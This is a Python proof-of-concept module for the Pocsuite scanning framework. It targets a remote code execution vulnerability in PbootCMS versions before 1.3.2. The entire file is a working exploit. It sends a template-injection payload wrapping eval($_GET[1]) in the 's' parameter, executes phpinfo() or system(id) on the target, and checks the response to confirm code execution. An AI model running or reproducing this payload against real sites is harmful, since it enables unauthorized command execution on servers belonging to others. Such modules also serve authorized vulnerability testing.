#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'pbootcms1.2.1 Remote Code Execution Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'code-exec'
    version = '1'
    references = ['https://xz.aliyun.com/t/3533']
    desc = '''pbootcms< v1.3.2 前台存在任意代码执行'''

    vulDate = '2018-05-21'
    createDate = '2019-04-03'
    updateDate = '2019-04-03'

    appName = 'pbootcms'
    appVersion = '< v1.3.2'
    appPowerLink = 'https://www.pbootcms.com/'
    samples = ['re']

    
    def _attack(self):
        """attack mode"""
        connect = '/index/index'
        result = {}
        payload1 = '/index.php'
        payload2 = '?s={pboot:if(eval($_GET[1]));//)})}}{/pboot:if}&1=phpinfo();'
        resp = req.get(self.url + payload1 + connect + payload2)
        time.sleep(2)
        if 'phpinfo' in resp.content:
            print("OK")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        connect = '/index/index'
        result = {}
        payload1 = '/index.php'
        payload2 = '?s={pboot:if(eval($_GET[1]));//)})}}{/pboot:if}&1=system(id);'
        resp = req.get(self.url + payload1 + connect + payload2)
        data = re.findall("uid", resp.content)
        if data:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

